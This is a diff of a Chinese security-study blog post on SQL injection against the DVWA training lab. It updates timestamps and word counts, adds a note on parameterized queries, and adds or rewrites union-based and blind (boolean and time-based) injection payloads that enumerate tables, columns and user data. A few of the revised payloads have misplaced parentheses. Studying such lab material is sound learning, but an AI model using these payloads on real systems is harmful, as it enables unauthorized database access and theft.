@@ -116,7 +116,7 @@
 <meta property="og:image" content="http://example.com/images/DVWA/image-20220915110012762.png">
 <meta property="og:image" content="https://pics5.baidu.com/feed/c75c10385343fbf24af4ab2ac043098864388fa1.jpeg?token=2667063c99dccb430c54db2ed00c381f">
 <meta property="article:published_time" content="2022-08-30T03:19:01.000Z">
-<meta property="article:modified_time" content="2022-09-21T08:44:54.797Z">
+<meta property="article:modified_time" content="2022-10-20T05:25:00.595Z">
 <meta property="article:author" content="rikka">
 <meta property="article:tag" content="study">
 <meta name="twitter:card" content="summary">
@@ -329,7 +329,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-09-21 16:44:54" itemprop="dateModified" datetime="2022-09-21T16:44:54+08:00">2022-09-21</time>
+      <time title="修改时间：2022-10-20 13:25:00" itemprop="dateModified" datetime="2022-10-20T13:25:00+08:00">2022-10-20</time>
     </span>
 
   
@@ -339,14 +339,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>48k</span>
+      <span>49k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>43 分钟</span>
+      <span>44 分钟</span>
     </span>
 </div>
 
@@ -361,7 +361,7 @@
 <span id="more"></span>
 
 <h1 id="1-SQL注入（SQL-Injection）"><a href="#1-SQL注入（SQL-Injection）" class="headerlink" title="1.SQL注入（SQL Injection）"></a>1.SQL注入（SQL Injection）</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入详解</a><br>结构化查询语言（Structured Query Language，SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
-<p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）。</p>
+<p>SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限）。</p>
 <p>即：注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询</p>
 <blockquote>
 <p>手工注入（非盲注）的步骤。</p>
@@ -376,8 +376,9 @@
 </blockquote>
 <h2 id="如何防御SQL注入"><a href="#如何防御SQL注入" class="headerlink" title="如何防御SQL注入"></a>如何防御SQL注入</h2><p>代码层面：</p>
 <p>1.对输入进行严格的转义和过滤</p>
-<p>2.使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
-<p>3.PDO预处理 (Java、PHP防范推荐方法)</p>
+<p>2.使用参数化（Parameterized）查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数化查询（Parameterized Query或Parameterized Statement）是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值，这个方法已被视为最有效可预防SQL注入攻击的攻击手法的防御方式。</span><br></pre></td></tr></table></figure>
+
 <p>网络层面：</p>
 <p>1.通过WAF设备启用防SQL Inject注入策略（或类似防护系统）</p>
 <p>2.云端防护（如阿里云盾）</p>
@@ -456,6 +457,8 @@
 <p> 符号“.”代表下一级</p>
 <p> <strong>表名</strong></p>
 <p> <code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#</code></p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</span><br></pre></td></tr></table></figure>
+
 <p> <img data-src="https://img-blog.csdnimg.cn/d6b9701ac4004104a0c370ea61aa15a5.png" alt="在这里插入图片描述"></p>
 <p> 可以用group_concat把表名拼接起来</p>
 <p> <code>-1&#39; union select 1, group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;#</code></p>
@@ -465,6 +468,7 @@
 <p> <strong>列名</strong></p>
 <p> <code> -1&#39; union select  1, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;#</code></p>
 <p> 当发现有重复列名时，因为有多个数据库的列名可能重复可以加一个判定table_schema&#x3D;”dvwa”</p>
+<p> <code> -1&#39; union select  1, group_concat(column_name) from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&#39;users&#39;#</code></p>
 <p> <img data-src="https://img-blog.csdnimg.cn/a92f4e5f4398429ab125d82d7f627a09.png" alt="在这里插入图片描述"></p>
 </blockquote>
 <blockquote>
@@ -489,6 +493,9 @@
 </tr>
 </tbody></table>
 </blockquote>
+<p>如果出现<code>Illegal mix of collations for operation &#39;UNION&#39;报错</code>，可以用16进制来实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select group_concat(hex(user_id),hex(first_name)),group_concat(hex(user),hex(password)) from users#</span><br></pre></td></tr></table></figure>
+
 <h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>这里不再让用户输入id，而是使用下拉框选择参数，但是可以使用burpsuite抓包修改post的参数</p>
 <p><img data-src="https://img-blog.csdnimg.cn/5d5180af9ca34780a597cc70c64ad49b.png" alt="在这里插入图片描述"></p>
 <h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>proxy-open brower(intercept off)-submit(intercept on)-抓包如下</p>
@@ -556,7 +563,7 @@
 <p><img data-src="https://img-blog.csdnimg.cn/edd6f23e582a49e1838bd5360d5b8899.png" alt="在这里插入图片描述"></p>
 <p>说明存在字符型的SQL盲注</p>
 <h4 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2.猜解当前数据库名"></a>2.猜解当前数据库名</h4><p>方法大概就是先判断长度，再通过缩小ascii码范围判断每个字符。</p>
-<p>输入1’ and length(database())&#x3D;4#</p>
+<p>输入<code>1&#39; and length(database())=4#</code></p>
 <p><img data-src="https://img-blog.csdnimg.cn/f8f2f4abb7dd456592786db5dea1e930.png" alt="在这里插入图片描述"></p>
 <p>说明数据库名长度为4。</p>
 <p>然后采用二分法猜解数据库名</p>
@@ -573,12 +580,12 @@
 <p>显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
 <p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了（就嗯猜)</p>
 <h4 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h4><p>先猜表的数量</p>
-<p>输入1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;2#</p>
+<p>输入<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2#</code></p>
 <p><img data-src="https://img-blog.csdnimg.cn/16a09022b9cb4122a8e0cf11b53b7113.png" alt="在这里插入图片描述"></p>
 <p>说明数据库中共有两个表</p>
 <p>然后重复类似猜数据库名的步骤</p>
 <p>猜表名长度</p>
-<p>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;1 #</p>
+<p>1’ and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1)&#x3D;5 #</p>
 <blockquote>
 <p>limit 0,1, 从你的表中的第0个数据开始，只读取一个；<br>这里substr将每行的字符串从第一个位置开始截取（即该行的字符串）</p>
 </blockquote>
@@ -588,7 +595,7 @@
 <h4 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h4><p>首先猜解表中字段的数量</p>
 <p>1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’)&#x3D;1 #</p>
 <p>接着挨个猜解字段长度</p>
-<p>1’ and length(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 0,1),1))&#x3D;1 #</p>
+<p>1’ and (select length(column_name) from information_schema.columns where table_name&#x3D; ‘users’ limit 3,1))&#x3D;4 #</p>
 <p>然后猜字段名</p>
 <p>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 0,1),1,1))&gt;97 #</p>
 <h4 id="5-猜解表中的数据"><a href="#5-猜解表中的数据" class="headerlink" title="5.猜解表中的数据"></a>5.猜解表中的数据</h4><p>如上操作，就嗯猜</p>
@@ -612,15 +619,17 @@
 <p>猜数据库名</p>
 <p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
 <h4 id="3-猜解数据库中的表名-1"><a href="#3-猜解数据库中的表名-1" class="headerlink" title="3.猜解数据库中的表名"></a>3.猜解数据库中的表名</h4><p>猜表数</p>
-<p>1’ and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;1,sleep(5),1)# </p>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;2,sleep(2),1)#</p>
 <p>猜表名</p>
-<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit </p>
-<p>0,1),1))&#x3D;1,sleep(5),1) # 没有延迟</p>
+<p>1’ and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1)&#x3D;5,sleep(2),1) # </p>
+<p>1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1,1))&#x3D;117,sleep(2),1) #</p>
 <h4 id="4-猜解表中的字段名-1"><a href="#4-猜解表中的字段名-1" class="headerlink" title="4.猜解表中的字段名"></a>4.猜解表中的字段名</h4><p>猜字段数</p>
-<p>1’ and if((select count(column_name) from information_schema.columns where table_name&#x3D; ‘users’)&#x3D;1,sleep(5),1)#</p>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name&#x3D; ‘users’ and table_schema&#x3D;database())&#x3D;8,sleep(2),1)#</p>
 <p>猜字段名</p>
-<p>1’ and if(length(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 0,1),1))&#x3D;1,sleep(5),1) #</p>
-<h4 id="5-猜解表中的数据-1"><a href="#5-猜解表中的数据-1" class="headerlink" title="5.猜解表中的数据"></a>5.猜解表中的数据</h4><p>嗯猜</p>
+<p>1’ and if((select length(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D; ‘users’ limit 3,1)&#x3D;4,sleep(2),1) #</p>
+<p>1’ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘users’ limit 3,1),1,1)),sleep(2),1)&#x3D; 117#</p>
+<h4 id="5-猜解表中的数据-1"><a href="#5-猜解表中的数据-1" class="headerlink" title="5.猜解表中的数据"></a>5.猜解表中的数据</h4><p>1’ and if((select count(user) from users)&#x3D;5,sleep(2),1)#<br>1’ and if((select length(user) from users limit 0,1)&#x3D;5,sleep(2),1)#<br>1’ and if(ascii(substr((select user from users limit 0,1),1,1))&#x3D;97,sleep(2),1)#</p>
+<p>嗯猜</p>
 <h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>转义+盲注</p>
 <p>步骤如SQL Injection Medium+布尔盲注，如</p>
 <h3 id="基于布尔的盲注-1"><a href="#基于布尔的盲注-1" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>抓包改参数id&#x3D;1 and length(database())&#x3D;4 #，显示存在，说明数据库名的长度为4个字符；</p>
@@ -1368,13 +1377,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">82k</span>
+    <span title="站点总字数">83k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:15</span>
+    <span title="站点阅读时长">1:16</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
